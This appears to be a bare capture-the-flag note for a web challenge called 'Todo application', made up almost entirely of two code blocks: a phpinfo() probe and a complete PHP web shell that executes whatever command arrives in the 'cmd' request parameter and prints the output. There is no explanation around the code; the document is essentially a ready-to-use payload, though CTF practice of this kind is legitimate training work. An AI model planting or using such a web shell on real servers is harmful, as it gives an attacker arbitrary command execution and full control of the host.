# Todo application:
Link: https://battle.cookiearena.org/challenges/web/todo-application


code:
```
<? phpinfo();?>
```
code:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="100">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
      $a= exec($_GET['cmd']);
    }
    echo($a);
?>
</pre>
</body>
</html>
```